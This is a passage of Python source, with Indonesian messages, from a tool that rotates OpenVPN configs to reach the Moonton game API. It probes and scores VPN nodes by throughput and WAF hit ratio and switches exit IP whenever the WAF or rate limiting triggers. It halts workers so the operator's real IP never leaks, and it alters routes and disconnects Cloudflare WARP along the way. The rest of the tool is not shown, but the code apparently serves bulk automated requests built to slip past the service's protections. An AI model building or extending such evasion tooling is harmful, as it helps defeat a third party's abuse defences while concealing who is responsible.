                    await _run_ip('route', 'replace', net_dst, 'dev', dev, 'scope', 'link', 'table', '100')
            if gw:
                await _run_ip('route', 'replace', 'default', 'via', gw, 'dev', dev, 'onlink', 'table', '100')
            else:
                await _run_ip('route', 'replace', 'default', 'dev', dev, 'table', '100')
            for iface in ('all', dev):
                rp = f"/proc/sys/net/ipv4/conf/{iface.replace('.', '/')}/rp_filter"
                if os.path.isfile(rp):
                    try:
                        with open(rp, 'w') as f:
                            f.write('2\n')
                    except Exception:
                        pass
            for ip_addr in ips:
                await _run_ip('rule', 'del', 'from', f'{ip_addr}/32', 'table', '100')
                rc_r, _ = await _run_ip('rule', 'add', 'from', f'{ip_addr}/32', 'table', '100', 'priority', '100')
                if rc_r == 0:
                    p_out(f"{c(GRAY)}[*] Policy route VPS/SSH aktif: {ip_addr} -> {dev} (table 100) ✓{W}")
        except Exception as exc:
            dbg(f"preserve_linux_vps_routes note: {exc}")

    async def _cleanup_win_ovpn_state(self):
        """Bersihkan sisa IP/route OpenVPN yang tertinggal jika proses sebelumnya ter-kill paksa."""
        if os.name != 'nt':
            return
        ps_cmd = (
            "Get-NetAdapter -Name 'OpenVPN*' -ErrorAction SilentlyContinue | "
            "Where-Object {$_.Status -ne 'Up'} | ForEach-Object { "
            "Remove-NetRoute -InterfaceIndex $_.ifIndex -DestinationPrefix '0.0.0.0/1','128.0.0.0/1' -Confirm:$false -ErrorAction SilentlyContinue; "
            "netsh interface ip set address $_.ifIndex dhcp | Out-Null "
            "}"
        )
        try:
            proc = await asyncio.create_subprocess_exec(
                'powershell', '-NoProfile', '-Command', ps_cmd,
                stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
            )
            await asyncio.wait_for(proc.wait(), timeout=5.0)
        except Exception:
            pass

    async def stop_ovpn(self):
        global _ovpn_pid
        p = self._ovpn_proc
        mgmt_port = self._ovpn_mgmt_port
        self._ovpn_proc = None
        self._ovpn_mgmt_port = 0
        had_force_kill = False
        if p is not None:
            try:
                if p.returncode is None:
                    if mgmt_port:
                        try:
                            reader, writer = await asyncio.wait_for(
                                asyncio.open_connection('127.0.0.1', mgmt_port), timeout=1.5
                            )
                            writer.write(b"signal SIGTERM\n")
                            await writer.drain()
                            writer.close()
                            try:
                                await writer.wait_closed()
                            except Exception:
                                pass
                            await asyncio.wait_for(p.wait(), timeout=3.5)
                        except Exception:
                            pass
                    if p.returncode is None:
                        had_force_kill = True
                        if os.name != 'nt':
                            try:
                                os.killpg(p.pid, signal.SIGTERM)
                            except Exception:
                                p.terminate()
                        else:
                            p.terminate()
                        try:
                            await asyncio.wait_for(p.wait(), timeout=3.0)
                        except asyncio.TimeoutError:
                            _kill_pid_tree(p.pid)
                            try:
                                await asyncio.wait_for(p.wait(), timeout=2.0)
                            except Exception:
                                pass
            except Exception:
                had_force_kill = True
                _kill_pid_tree(getattr(p, 'pid', None))
        _ovpn_pid = None
        if had_force_kill:
            await self._cleanup_win_ovpn_state()

    def _build_ovpn_cmd(self, cfg: str, mgmt_port: int = 0, is_win: bool | None = None) -> list[str]:
        win = (os.name == 'nt') if is_win is None else bool(is_win)
        # ponytail: --ignore-unknown-option must precede --config so Linux OpenVPN skips Windows block-outside-dns
        cmd = [self.ovpn_bin or 'openvpn']
        if not win:
            cmd.extend(['--ignore-unknown-option', 'block-outside-dns', '--pull-filter', 'ignore', 'block-outside-dns'])
        cmd.extend(['--config', cfg, '--auth-nocache'])
        if mgmt_port:
            cmd.extend(['--management', '127.0.0.1', str(mgmt_port)])
        if win:
            if self.ovpn_disable_dco:
                cmd.append('--disable-dco')
            if self.ovpn_ignore_dns_block:
                cmd.extend(['--pull-filter', 'ignore', 'block-outside-dns'])
        if self.ovpn_auth:
            cmd.extend(['--auth-user-pass', os.path.abspath(self.ovpn_auth)])
        return cmd

    @staticmethod
    def _ovpn_is_tcp(cfg: str) -> bool:
        return bool(re.search(r'[._-]tcp\.ovpn$', cfg or '', re.I))

    @staticmethod
    def _ovpn_group_key(cfg: str) -> str:
        bn = os.path.basename(cfg or '')
        return re.sub(r'[._-](udp|tcp)\.ovpn$', '', bn, flags=re.I)

    def _pick_next_ovpn(self) -> str:
        n = len(self.ovpn_files)
        now_t = time.monotonic()
        best_idx = self.ovpn_idx % n
        best_score = (2, 2, float('inf'), float('inf'))
        for off in range(n):
            idx = (self.ovpn_idx + off) % n
            cand = self.ovpn_files[idx]
            gk = self._ovpn_group_key(cand)
            cd = max(self.ovpn_cooldown_until.get(cand, 0.0), self.ovpn_cooldown_until.get(gk, 0.0))
            tcp_rank = 1 if self._ovpn_is_tcp(cand) else 0
            sc = (0 if cd <= now_t else 1, tcp_rank, -round(self.node_score(cand), 2), cd)
            if sc < best_score:
                best_score = sc
                best_idx = idx
        self.ovpn_idx = best_idx + 1
        return self.ovpn_files[best_idx]

    def _node_scores_path(self) -> str:
        return os.path.join(os.path.abspath(self.ovpn_dir or BASE), '.ovpn_node_scores.json')

    def _load_node_scores(self, ttl_s: float = 604800.0) -> dict:
        p = self._node_scores_path()
        try:
            if not os.path.isfile(p):
                return {}
            with open(p, encoding='utf-8') as f:
                raw = json.load(f)
            if not isinstance(raw, dict):
                return {}
            now_t = time.time()
            out = {}
            for k, v in raw.items():
                if not isinstance(v, dict):
                    continue
                try:
                    if (now_t - float(v.get('ts', 0))) <= ttl_s:
                        out[k] = v
                except (TypeError, ValueError):
                    continue
            return out
        except Exception:
            return {}

    def _save_node_scores(self):
        if not self.ovpn_dir:
            return
        try:
            p = self._node_scores_path()
            tmp = p + '.tmp'
            with open(tmp, 'w', encoding='utf-8') as f:
                json.dump(self.node_scores, f, indent=1)
            os.replace(tmp, p)
        except Exception:
            pass

    def node_score(self, cfg: str) -> float:
        gk = self._ovpn_group_key(cfg)
        rec = self.node_scores.get(gk)
        base = float(rec.get('score', 0.0)) if isinstance(rec, dict) else 0.0
        pen = float(self.ovpn_penalties.get(gk, 0)) * 0.6
        return round(base - pen, 3)

    def record_node_perf(self, cfg: str, rate: float, waf_ratio: float):
        if not cfg:
            return
        gk = self._ovpn_group_key(cfg)
        prev = self.node_scores.get(gk) if isinstance(self.node_scores.get(gk), dict) else {}
        runs = int(prev.get('runs', 0)) + 1
        prev_ewma = float(prev.get('rate_ewma', rate))
        rate_ewma = rate if runs == 1 else (0.65 * prev_ewma + 0.35 * rate)
        sample_score = rate_ewma - waf_ratio * 2.5
        prev_score = float(prev.get('score', sample_score))
        score = sample_score if runs == 1 else (0.6 * prev_score + 0.4 * sample_score)
        self.node_scores[gk] = {
            'rate_ewma': round(rate_ewma, 3),
            'score': round(score, 3),
            'waf_ewma': round(waf_ratio if runs == 1 else 0.7 * float(prev.get('waf_ewma', waf_ratio)) + 0.3 * waf_ratio, 3),
            'runs': runs,
            'ts': time.time(),
        }
        self._save_node_scores()

    def _penalize_current_ovpn(self):
        cfg = self.cur_ovpn_cfg
        if not cfg:
            return
        gk = self._ovpn_group_key(cfg)
        pen = self.ovpn_penalties.get(gk, 0) + 1
        self.ovpn_penalties[gk] = pen
        cd_until = time.monotonic() + min(1800.0, 180.0 * pen)
        self.ovpn_cooldown_until[cfg] = cd_until
        self.ovpn_cooldown_until[gk] = cd_until

    async def start_ovpn(self, cfg_override: str = '', timeout_s: float = 22.0, settle_s: float = 2.0) -> tuple[bool, str]:
        global _ovpn_pid
        await self.stop_ovpn()
        if not self.ovpn_bin or (not cfg_override and not self.ovpn_files):
            return False, 'no_ovpn_config'
        if cfg_override:
            cfg = cfg_override
        else:
            cfg = self._pick_next_ovpn()
        self.cur_ovpn_cfg = cfg
        if not os.path.isfile(cfg):
            return False, f"Config hilang: {os.path.basename(cfg)}"
        mgmt_port = 0
        try:
            import socket
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('127.0.0.1', 0))
                mgmt_port = s.getsockname()[1]
        except Exception:
            mgmt_port = 0
        cmd = self._build_ovpn_cmd(cfg, mgmt_port)
        kw = {
            'stdout': asyncio.subprocess.PIPE,
            'stderr': asyncio.subprocess.STDOUT,
            'cwd': os.path.dirname(os.path.abspath(cfg)) or None,
        }
        if os.name != 'nt':
            kw['start_new_session'] = True
        proc = await asyncio.create_subprocess_exec(*cmd, **kw)
        self._ovpn_proc = proc
        self._ovpn_mgmt_port = mgmt_port
        _ovpn_pid = proc.pid
        deadline = time.monotonic() + float(timeout_s)
        last_line = ''
        prev_line = ''
        ok = False
        while time.monotonic() < deadline:
            if proc.returncode is not None:
                break
            rem = max(0.2, deadline - time.monotonic())
            try:
                raw_ln = await asyncio.wait_for(proc.stdout.readline(), timeout=min(1.5, rem))
            except asyncio.TimeoutError:
                continue
            if not raw_ln:
                if proc.returncode is not None:
                    break
                continue
            ln = raw_ln.decode('utf-8', errors='ignore').strip()
            if ln:
                if 'use --help' in ln.lower() and prev_line:
                    last_line = f"{prev_line} | {ln}"
                else:
                    last_line = ln
                dbg(f"ovpn[{os.path.basename(cfg)}]: {ln[:90]}")
            low = ln.lower()
            if 'initialization sequence completed' in low:
                ok = True
                break
            if any(k in low for k in (
                'auth_failed', 'access is denied', 'cannot open tun',
                'operation not permitted', 'error: command failed', 'exiting due to fatal error',
            )):
                last_line = prev_line + " | " + ln if ('netsh:' in prev_line.lower() and prev_line) else ln
                break
            if ln:
                prev_line = ln
        if not ok:
            await self.stop_ovpn()
            if time.monotonic() >= deadline:
                return False, f"Timeout handshake OpenVPN ({int(timeout_s)}s)"
            return False, last_line or f"OpenVPN gagal konek ({os.path.basename(cfg)})"
        # Drain stdout asynchronously so OpenVPN never blocks on full pipe buffer
        async def _drain():
            try:
                while proc.returncode is None and proc.stdout:
                    chunk = await proc.stdout.read(1024)
                    if not chunk:
                        break
            except Exception:
                pass
        asyncio.create_task(_drain())
        if settle_s > 0:
            await asyncio.sleep(settle_s)
        if os.name == 'nt':
            try:
                p_dns = await asyncio.create_subprocess_exec(
                    'ipconfig', '/flushdns',
                    stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
                )
                await asyncio.wait_for(p_dns.wait(), timeout=2.0)
            except Exception:
                pass
        if not cfg_override:
            self.cur_ovpn_cfg = cfg
        return True, os.path.basename(cfg)

    async def _ensure_warp_off(self) -> bool:
        """Putuskan Cloudflare WARP sementara agar interface metric & DNS-nya tidak membajak OpenVPN."""
        if getattr(self, '_warp_disconnected_by_us', False):
            return False
        wcli = _find_warp_cli()
        if not wcli:
            return False
        try:
            proc = await asyncio.create_subprocess_exec(
                wcli, 'status',
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
            )
            out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=5.0)
            out_s = (out_b or b'').decode('utf-8', errors='ignore').lower()
            if 'connected' in out_s and 'disconnected' not in out_s:
                p_out(f"{c(GOLD)}[*] Cloudflare WARP aktif terdeteksi -> memutuskan sementara agar tidak bentrok dengan OpenVPN...{W}")
                p2 = await asyncio.create_subprocess_exec(
                    wcli, 'disconnect',
                    stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
                )
                await asyncio.wait_for(p2.wait(), timeout=8.0)
                await asyncio.sleep(2.0)
                self._warp_disconnected_by_us = True
                return True
        except Exception:
            pass
        return False

    async def restore_warp_if_needed(self):
        if not getattr(self, '_warp_disconnected_by_us', False):
            return
        self._warp_disconnected_by_us = False
        wcli = _find_warp_cli()
        if wcli:
            try:
                p2 = await asyncio.create_subprocess_exec(
                    wcli, 'connect',
                    stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL,
                )
                await asyncio.wait_for(p2.wait(), timeout=6.0)
                p_out(f"{c(GRAY)}[*] Cloudflare WARP disambungkan kembali ✓{W}")
            except Exception:
                pass

    def _ovpn_cache_path(self) -> str:
        return os.path.join(os.path.abspath(self.ovpn_dir or BASE), '.ovpn_probe_cache.json')

    @staticmethod
    def _ovpn_sig(cfg: str) -> list[int]:
        st = os.stat(cfg)
        return [int(getattr(st, 'st_mtime_ns', int(st.st_mtime * 1e9))), int(st.st_size)]

    def _load_probe_cache(self, ttl_s: float = 21600.0) -> dict:
        p = self._ovpn_cache_path()
        try:
            if not os.path.isfile(p):
                return {}
            with open(p, encoding='utf-8') as f:
                raw = json.load(f)
            if not isinstance(raw, dict):
                return {}
            now_t = time.time()
            return {
                k: v for k, v in raw.items()
                if isinstance(v, dict) and (now_t - float(v.get('ts', 0))) <= ttl_s
            }
        except Exception:
            return {}

    def _save_probe_cache(self, cache: dict):
        try:
            p = self._ovpn_cache_path()
            tmp = p + '.tmp'
            with open(tmp, 'w', encoding='utf-8') as f:
                json.dump(cache, f, indent=1)
            os.replace(tmp, p)
        except Exception:
            pass

    async def probe_ovpns(self, use_cache: bool = True, cache_ttl_s: float = 21600.0) -> list[str]:
        """Uji semua file .ovpn ke API Moonton (cache 6 jam + fast settle + parallel IP check, buang yang gagal, urut tercepat)."""
        if not self.ovpn_files:
            return []
        if os.name == 'nt':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    p_out(f"{c(RED)}[!] OpenVPN CLI di Windows butuh PowerShell Run as Administrator (netsh/TUN).{W}")
                    return []
            except Exception:
                pass
        await self._ensure_warp_off()
        await self._preserve_linux_vps_routes()
        await self._cleanup_win_ovpn_state()
        total = len(self.ovpn_files)
        cache = self._load_probe_cache(cache_ttl_s)
        if use_cache:
            _meta = cache.get('__meta__')
            if isinstance(_meta, dict):
                if _meta.get('dco_off'):
                    self.ovpn_disable_dco = True
                if _meta.get('no_dns_blk'):
                    self.ovpn_ignore_dns_block = True
        live: list[tuple[int, str, str]] = []
        to_probe: list[str] = []
        cached_drops = 0

        for cfg in self.ovpn_files:
            name = os.path.basename(cfg)
            ent = cache.get(name) if use_cache else None
            try:
                sig = self._ovpn_sig(cfg)
            except OSError:
                continue
            if ent and ent.get('sig') == sig:
                if ent.get('ok'):
                    ip_v = ent.get('ip', '')
                    live.append((int(ent.get('ms', 999)), cfg, f" IP:{ip_v}" if ip_v else ''))
                else:
                    cached_drops += 1
            else:
                to_probe.append(cfg)

        if use_cache and (live or cached_drops):
            p_out(f"{c(CYAN)}[*] Cache .ovpn (<6j): {len(live)} OK, {cached_drops} DROP | perlu uji: {len(to_probe)}/{total}{W}")
        if to_probe:
            p_out(f"{c(CYAN)}[*] Menguji {len(to_probe)} config OpenVPN ke API Moonton (fast mode)...{W}")

        fatal_perm = False
        win_diag_tries = 0
        # ponytail: sequential TUN probes (OS single-default-route constraint); use 0.25s settle + parallel Moonton/IP check + 6h cache
        for idx, cfg in enumerate(to_probe, 1):
            name = os.path.basename(cfg)
            ok_tun, tun_msg = await self.start_ovpn(cfg_override=cfg, timeout_s=9.0, settle_s=0.25)
            if not ok_tun:
                low_m = tun_msg.lower()
                if os.name == 'nt' and (not self.ovpn_disable_dco) and ('netsh:' in low_m or 'command failed' in low_m):
                    p_out(f" {c(GOLD)}[*] {name} netsh/DCO gagal -> coba TAP (--disable-dco)...{W}")
                    self.ovpn_disable_dco = True
                    ok_tun, tun_msg = await self.start_ovpn(cfg_override=cfg, timeout_s=9.0, settle_s=0.25)
                    low_m = tun_msg.lower()
                if not ok_tun:
                    p_out(f" {c(RED)}[DROP]{W} [{idx:>2}/{len(to_probe)}] {name} -> {c(GOLD)}{tun_msg[:58]}{W}")
                    if any(k in low_m for k in ('access is denied', 'operation not permitted', 'auth_failed', 'cannot open tun')):
                        fatal_perm = True
                        if os.name == 'nt' and 'auth_failed' not in low_m:
                            p_out(f" {c(GOLD)}[!] Tip Windows: jalankan terminal sebagai Administrator agar OpenVPN bisa membuat TUN.{W}")
                        elif os.name != 'nt' and 'auth_failed' not in low_m:
                            is_root = hasattr(os, 'geteuid') and os.geteuid() == 0
                            if is_root and ('cannot open tun' in low_m or 'no such file' in low_m):
                                p_out(f" {c(GOLD)}[!] Tip Proxmox/LXC: /dev/net/tun belum aktif di host; tambahkan device passthrough di host node.{W}")
                            elif not is_root:
                                p_out(f" {c(GOLD)}[!] Tip Linux: jalankan script dengan sudo.{W}")
                        break
                    try:
                        cache[name] = {'sig': self._ovpn_sig(cfg), 'ts': time.time(), 'ok': False, 'reason': tun_msg[:40]}
                        self._save_probe_cache(cache)
                    except OSError:
                        pass
                    continue

            async def _probe_pair():
                if self.ip_check:
                    mt_res, ip_res = await asyncio.gather(
                        _probe_direct_moonton_ms(timeout_s=4.0),
                        fetch_public_ip(timeout_s=2.5),
                    )
                    return mt_res, ip_res
                return await _probe_direct_moonton_ms(timeout_s=4.0), 'unknown'

            (ok_mt, mt_reason, ms), ip_val = await _probe_pair()
            if (not ok_mt) and ('405' not in mt_reason):
                await asyncio.sleep(0.6)
                (ok_mt, mt_reason, ms), ip_val2 = await _probe_pair()
                if ip_val == 'unknown' and ip_val2 != 'unknown':
                    ip_val = ip_val2

            if (not ok_mt) and os.name == 'nt' and win_diag_tries < 2:
                win_diag_tries += 1
                dco_was_forced = self.ovpn_disable_dco
                await self.stop_ovpn()
                if not dco_was_forced:
                    p_out(f" {c(GOLD)}[*] {name} konek tapi tidak tembus ({mt_reason}) -> coba fallback TAP (--disable-dco)...{W}")
                    self.ovpn_disable_dco = True
                    ok2, _ = await self.start_ovpn(cfg_override=cfg, timeout_s=9.0, settle_s=0.5)
                    if ok2:
                        ok_mt, mt_reason, ms = await _probe_direct_moonton_ms(timeout_s=4.0)
                if ok_mt and not dco_was_forced:
                    p_out(f" {c(GREEN)}[*] Mode TAP (--disable-dco) berhasil menembus API Moonton! ✓{W}")
                else:
                    await self.stop_ovpn()
                    p_out(f" {c(GOLD)}[*] Masih gagal -> coba bypass block-outside-dns...{W}")
                    self.ovpn_ignore_dns_block = True
                    ok3, _ = await self.start_ovpn(cfg_override=cfg, timeout_s=9.0, settle_s=0.5)
                    if ok3:
                        ok_mt, mt_reason, ms = await _probe_direct_moonton_ms(timeout_s=4.0)
                    if ok_mt:
                        p_out(f" {c(GREEN)}[*] Mode bypass block-outside-dns berhasil! ✓{W}")
                    else:
                        if ok3:
                            raw_ip_chk = await fetch_public_ip(timeout_s=3.0)
                            p_out(f" {c(GOLD)}[DIAG] Exit IP check saat tunnel aktif: {raw_ip_chk}{W}")
                        self.ovpn_disable_dco = dco_was_forced
                        self.ovpn_ignore_dns_block = False

            ip_str = f" IP:{ip_val}" if (ok_mt and ip_val != 'unknown') else ''
            await self.stop_ovpn()
            try:
                cache[name] = {
                    'sig': self._ovpn_sig(cfg), 'ts': time.time(),
                    'ok': bool(ok_mt), 'ms': int(ms),
                    'ip': '' if ip_val == 'unknown' else ip_val,
                }
                self._save_probe_cache(cache)
            except OSError:
                pass
            if ok_mt:
                live.append((ms, cfg, ip_str))
                p_out(f" {c(GREEN)}[ OK ]{W} [{idx:>2}/{len(to_probe)}] {name} -> {ms}ms{ip_str}")
            else:
                p_out(f" {c(RED)}[DROP]{W} [{idx:>2}/{len(to_probe)}] {name} -> {c(GOLD)}{mt_reason}{W}")

        await self.stop_ovpn()
        if os.name == 'nt' and not fatal_perm:
            try:
                cache['__meta__'] = {
                    'ts': time.time(),
                    'dco_off': bool(self.ovpn_disable_dco),
                    'no_dns_blk': bool(self.ovpn_ignore_dns_block),
                }
                self._save_probe_cache(cache)
            except Exception:
                pass
        if fatal_perm or not live:
            self.ovpn_files = []
            return []
        live.sort(key=lambda x: x[0] + (400 if self._ovpn_is_tcp(x[1]) else 0) - min(80, int(self.node_score(x[1]) * 20)))
        self.ovpn_files = [cfg for _, cfg, _ in live]
        self.ovpn_idx = 0
        p_out(f" {c(GREEN)}[ OK ]{W} {len(live)}/{total} OpenVPN lolos uji API Moonton (tercepat: {os.path.basename(live[0][1])} {live[0][0]}ms)")
        return self.ovpn_files

    def _drop_probe_cache_entry(self, cfg_name: str):
        if not cfg_name:
            return
        cache = self._load_probe_cache()
        if cfg_name in cache:
            cache.pop(cfg_name, None)
            self._save_probe_cache(cache)

    async def start_initial_ovpn(self, stats_dict: dict) -> bool:
        if not self.ovpn_files:
            return True
        await self._ensure_warp_off()
        await self._preserve_linux_vps_routes()
        await self._cleanup_win_ovpn_state()
        if not _TUI_ACTIVE:
            p_out(f"{c(CYAN)}[*] Menghubungkan OpenVPN tercepat ({os.path.basename(self.ovpn_files[0])})...{W}")
        for _ in range(min(10, len(self.ovpn_files))):
            cur_cfg = self._pick_next_ovpn()
            cur_cfg_name = os.path.basename(cur_cfg)
            ok, info = await self.start_ovpn(cfg_override=cur_cfg, timeout_s=12.0)
            if (not ok) and os.name == 'nt' and (not self.ovpn_disable_dco) and ('netsh:' in info.lower() or 'command failed' in info.lower()):
                p_out(f"{c(GOLD)}[*] {cur_cfg_name} netsh/DCO gagal -> coba fallback TAP (--disable-dco)...{W}")
                self.ovpn_disable_dco = True
                ok, info = await self.start_ovpn(cfg_override=cur_cfg, timeout_s=12.0)
            if ok:
                ok_mt, mt_reason, ms = await _probe_direct_moonton_ms(timeout_s=6.0)
                if ok_mt:
                    self.ovpn_started = True
                    if self.ip_check:
                        new_ip = await fetch_public_ip(timeout_s=3.0)
                        if new_ip != 'unknown':
                            self.current_ip = new_ip
                    stats_dict['proxy_label'] = self.label()
                    _PERF.resume()
                    if not _TUI_ACTIVE:
                        p_out(f"{c(GREEN)}[*] OpenVPN terhubung [{info}] {ms}ms (IP: {self.current_ip}) ✓{W}")
                    return True
                p_out(f"{c(GOLD)}[!] OpenVPN {info} tidak tembus API Moonton ({mt_reason}), coba berikutnya...{W}")
                self._penalize_current_ovpn()
                self._drop_probe_cache_entry(cur_cfg_name)
                await self.stop_ovpn()
            else:
                p_out(f"{c(RED)}[!] OpenVPN gagal start: {info}{W}")
                low_i = info.lower()
                if os.name == 'nt' and any(k in low_i for k in ('denied', 'tun', 'tap', 'route', 'privileg')):
                    p_out(f"{c(GOLD)}[!] Tip Windows: jalankan terminal sebagai Administrator agar OpenVPN bisa buat interface TUN.{W}")
                    return False
                elif os.name != 'nt' and any(k in low_i for k in ('permitted', 'tun', 'permission', 'no such file')):
                    is_root = hasattr(os, 'geteuid') and os.geteuid() == 0
                    if is_root:
                        p_out(f"{c(GOLD)}[!] Tip Proxmox/LXC: /dev/net/tun belum aktif di host; tambahkan device passthrough di host node.{W}")
                    else:
                        p_out(f"{c(GOLD)}[!] Tip Linux: jalankan dengan sudo untuk interface TUN.{W}")
                    return False
                self._penalize_current_ovpn()
                self._drop_probe_cache_entry(cur_cfg_name)
        return False

    def record_ok(self):
        self.consec_waf_rate = 0
        self._recent_outcomes.append(True)
        if self.cur_ovpn_cfg and len(self._recent_outcomes) == self._recent_outcomes.maxlen and all(self._recent_outcomes):
            gk = self._ovpn_group_key(self.cur_ovpn_cfg)
            if self.ovpn_penalties.get(gk, 0) > 0:
                self.ovpn_penalties[gk] -= 1

    def _waf_tripped(self) -> bool:
        if self.consec_waf_rate >= self.waf_threshold:
            return True
        return len(self._recent_outcomes) >= 14 and self._recent_outcomes.count(False) >= 10

    def should_rotate_proactive(self, checked: int) -> bool:
        return self.rotate_every > 0 and (checked - self.last_rotate_checked) >= self.rotate_every

    def label(self) -> str:
        if self.ip_check and self.current_ip and self.current_ip != 'unknown':
            return f"VPN · {self.current_ip}"
        return "VPN · Direct"

    async def ensure_ovpn_alive(self, browser_state: dict | None, stats_dict: dict) -> bool:
        if self.ovpn_failed:
            raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
        if not (self.ovpn_files and self.ovpn_started):
            return True
        if self.rotating or not self.gate.is_set():
            try:
                await asyncio.wait_for(self.gate.wait(), timeout=320.0)
            except asyncio.TimeoutError:
                pass
            if self.ovpn_failed:
                raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
        if self._ovpn_proc is None or self._ovpn_proc.returncode is not None:
            _LIVE_LOGS.append(f" {c(RED)}!{W}  {c(RED)}OpenVPN terputus mid-run -> rotasi darurat...{W}")
            await self.coordinate('ovpn_drop', self.epoch, browser_state, stats_dict)
            if self.ovpn_failed:
                raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
        return True

    async def on_waf_or_rate(self, seen_epoch: int, reason: str, browser_state: dict | None, stats_dict: dict) -> bool:
        if self.ovpn_failed:
            raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
        if seen_epoch != self.epoch:
            if self.rotating or not self.gate.is_set():
                try:
                    await asyncio.wait_for(self.gate.wait(), timeout=320.0)
                except asyncio.TimeoutError:
                    pass
                if self.ovpn_failed:
                    raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
            return True
        if self.rotating:
            try:
                await asyncio.wait_for(self.gate.wait(), timeout=320.0)
            except asyncio.TimeoutError:
                pass
            if self.ovpn_failed:
                raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
            return True
        self.consec_waf_rate += 1
        self._recent_outcomes.append(False)
        if not self._waf_tripped():
            return False
        return await self.coordinate(f"waf:{reason}", seen_epoch, browser_state, stats_dict)

    async def coordinate(self, trigger: str, seen_epoch: int, browser_state: dict | None, stats_dict: dict) -> bool:
        async with self.lock:
            if self.ovpn_failed:
                raise RuntimeError("OpenVPN rotation failed - stopping worker to protect IP")
            if seen_epoch != self.epoch:
                return True
            if not trigger.startswith(('proactive', 'ovpn_drop', 'slow:')) and not self._waf_tripped():
                return False
            self.rotating = True
            self.gate.clear()
            prev_status = stats_dict.get('status', 'RUNNING')
            stats_dict['status'] = 'WAF_WAIT'
            old_ip = self.current_ip
            _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}VPN {trigger}: pause workers...{W}")
            render_dashboard(force=True)
            cmd_ok = True
            ip_changed = True
            try:
                if self.ovpn_files:
                    if self.cur_ovpn_cfg:
                        n_rate, n_waf, n_el = _PERF.current_node_summary()
                        if n_el >= 8.0:
                            self.record_node_perf(self.cur_ovpn_cfg, n_rate, n_waf)
                    if trigger.startswith(('waf:', 'slow:', 'ovpn_drop')):
                        self._penalize_current_ovpn()
                    cmd_ok = False
                    last_ov_err = ''
                    for _ov_try in range(len(self.ovpn_files)):
                        nxt_cfg = self._pick_next_ovpn()
                        nxt_name = os.path.basename(nxt_cfg)
                        nxt_idx = self.ovpn_files.index(nxt_cfg) + 1 if nxt_cfg in self.ovpn_files else ((_ov_try % len(self.ovpn_files)) + 1)
                        if not _TUI_ACTIVE:
                            p_out(f"\n{c(GOLD)}[*] VPN {trigger}: rotasi OpenVPN #{nxt_idx}/{len(self.ovpn_files)} ({nxt_name})...{W}")
                        else:
                            _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}OVPN #{nxt_idx}: {nxt_name[:26]}{W}")
                            render_dashboard(force=True)
                        ok_s, info_s = await self.start_ovpn(cfg_override=nxt_cfg)
                        if not ok_s:
                            last_ov_err = info_s
                            self._penalize_current_ovpn()
                            if not _TUI_ACTIVE:
                                p_out(f"{c(RED)}[!] OpenVPN rotasi gagal: {info_s}{W}")
                            else:
                                _LIVE_LOGS.append(f" {c(RED)}!{W}  {c(RED)}OVPN err: {info_s[:28]}{W}")
                            continue
                        ok_mt, mt_reason, _ = await _probe_direct_moonton_ms(timeout_s=6.0)
                        if ok_mt:
                            cmd_ok = True
                            break
                        last_ov_err = mt_reason
                        if not _TUI_ACTIVE:
                            p_out(f"{c(GOLD)}[!] OpenVPN {info_s} gagal ke API Moonton ({mt_reason}), ganti config berikutnya...{W}")
                        else:
                            _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}OVPN drop: {mt_reason[:24]}{W}")
                        self._penalize_current_ovpn()
                        await self.stop_ovpn()
                    if not cmd_ok:
                        self.ovpn_failed = True
                        self.epoch += 1
                        raise RuntimeError(f"Semua OpenVPN gagal rotasi ({last_ov_err[:50]}) - dihentikan agar IP asli tidak bocor")
                    if self.ip_check:
                        new_ip = await fetch_public_ip(timeout_s=3.0)
                        if new_ip != 'unknown':
                            self.current_ip = new_ip
                elif self.vpn_cmd:
                    if not _TUI_ACTIVE:
                        p_out(f"\n{c(GOLD)}[*] VPN {trigger}: menjalankan --vpn-cmd...{W}")
                    kw = {'stdout': asyncio.subprocess.PIPE, 'stderr': asyncio.subprocess.PIPE}
                    if os.name != 'nt':
                        kw['start_new_session'] = True
                    proc = await asyncio.create_subprocess_shell(self.vpn_cmd, **kw)
                    try:
                        _, err_b = await asyncio.wait_for(proc.communicate(), timeout=45.0)
                        if proc.returncode != 0:
                            cmd_ok = False
                            err_s = (err_b or b'').decode('utf-8', errors='ignore').strip()[:80]
                            dbg(f"--vpn-cmd exit {proc.returncode}: {err_s}")
                            if not _TUI_ACTIVE:
                                p_out(f"{c(RED)}[!] --vpn-cmd exit {proc.returncode}: {err_s}{W}")
                    except asyncio.TimeoutError:
                        cmd_ok = False
                        try:
                            if os.name != 'nt':
                                os.killpg(proc.pid, signal.SIGKILL)
                            else:
                                proc.kill()
                        except Exception:
                            pass
                        try:
                            await asyncio.wait_for(proc.wait(), timeout=3.0)
                        except Exception:
                            pass
                        if not _TUI_ACTIVE:
                            p_out(f"{c(RED)}[!] --vpn-cmd timeout 45s{W}")
                    await asyncio.sleep(2.0)
                    if self.ip_check:
                        new_ip = await fetch_public_ip(timeout_s=3.0)
                        if new_ip != 'unknown':
                            self.current_ip = new_ip
                elif self.vpn_wait:
                    if self.ip_check and old_ip != 'unknown':
                        msg_wait = f"Ganti VPN! IP: {old_ip}"
                        _LIVE_LOGS.append(f" {c(GOLD)}!{W}  {c(GOLD)}{msg_wait}{W}")
                        if not _TUI_ACTIVE:
                            p_out(f"\n{c(GOLD)}[*] VPN {trigger}: silakan ganti server VPN (IP saat ini: {old_ip})...{W}")
                        deadline = time.monotonic() + 300.0
                        ip_changed = False
                        while time.monotonic() < deadline:
                            await asyncio.sleep(3.0)
